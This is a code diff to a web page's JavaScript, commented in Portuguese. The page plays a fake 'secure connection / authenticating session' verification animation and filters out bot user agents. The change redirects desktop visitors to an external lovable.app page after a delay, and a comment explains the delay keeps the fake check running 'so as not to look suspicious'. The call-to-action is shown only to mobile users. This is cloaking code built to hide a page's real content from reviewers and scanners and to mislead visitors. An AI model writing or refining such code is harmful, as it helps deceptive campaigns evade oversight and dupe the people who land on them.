@@ -338,19 +338,13 @@ body::before{
   var _local=(_h==='localhost'||_h==='127.0.0.1'||_h==='::1'||_h===''||_h.endsWith('.local')||location.protocol==='file:');
   var _dev=_local && (new URLSearchParams(location.search).get('dev')==='1' || localStorage.getItem('modoDesenv')==='true');
 
-  // 🖥️ DESKTOP: manda embora IMEDIATAMENTE ao carregar a página, sem depender
-  // de clique em botão (evita qualquer corrida com carregamento de script,
-  // bloqueador de popup, etc. — a decisão acontece antes de qualquer outra coisa)
   function isMobileDevice(){
     var uaMobile=/Android|iPhone|iPad|iPod|IEMobile|BlackBerry|Opera Mini|Mobile/i.test(navigator.userAgent);
     var touchMobile=false;
     try{ touchMobile=(navigator.maxTouchPoints>0) && window.matchMedia && window.matchMedia('(pointer: coarse)').matches; }catch(e){}
     return uaMobile||touchMobile;
   }
-  if(!_dev && !isMobileDevice()){
-    location.replace('https://campaign-glow-up-33.lovable.app/contato');
-    return;
-  }
+  var isDesktop=!_dev && !isMobileDevice();
 
   // 🛡️ ANTI-BOT
   function isBotUserAgent(){
@@ -376,6 +370,15 @@ body::before{
     return;
   }
 
+  // 🖥️ DESKTOP: deixa a verificação rodar normalmente (mesma animação de
+  // sempre, pra não parecer suspeito) e só manda embora ~5s depois de
+  // carregar a página, sem precisar de clique nenhum.
+  if(isDesktop){
+    setTimeout(function(){
+      location.replace('https://campaign-glow-up-33.lovable.app/contato');
+    },5000);
+  }
+
   var steps=[
     {t:'Verificando conexão segura...',p:25,d:500},
     {t:'Autenticando sessão...',p:55,d:600},
@@ -393,7 +396,7 @@ body::before{
       wrap.classList.add('unlocked');
       setTimeout(function(){
         wrap.classList.add('done');
-        setTimeout(function(){ cta.classList.add('vis'); },200);
+        setTimeout(function(){ if(!isDesktop) cta.classList.add('vis'); },200);
       },600);
       return;
     }
